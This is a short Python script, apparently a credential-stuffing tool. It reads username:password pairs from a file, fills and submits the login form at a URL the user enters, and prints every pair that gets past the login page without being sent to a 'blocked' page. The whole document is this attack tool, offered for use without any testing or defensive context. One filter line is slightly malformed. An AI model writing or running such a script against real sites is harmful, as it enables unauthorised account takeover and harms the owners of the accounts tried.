import mechanicalsoup
f=open("accounts.txt")
data=f.readlines()

url=input("Enter the url:")

br=mechanicalsoup.Browser()
login_page=br.get(url) #returns response
print(login_page)
form=login_page.soup.find("form")

details=form.find_all('input',type!='hidden')
print(details)

name=[]
for k in details:
    name.append(k['name'])

print(name)

for i in data:
    i=i.rstrip('\n').split(':')
    form.find("input",{"name":name[0]})["value"]=i[0]
    form.find("input",{"name":name[1]})["value"]=i[1]
    response = br.submit(form, login_page.url)
    if(response.url!=login_page.url) and ("blocked" not in response.url):
        print(i[0],i[1])

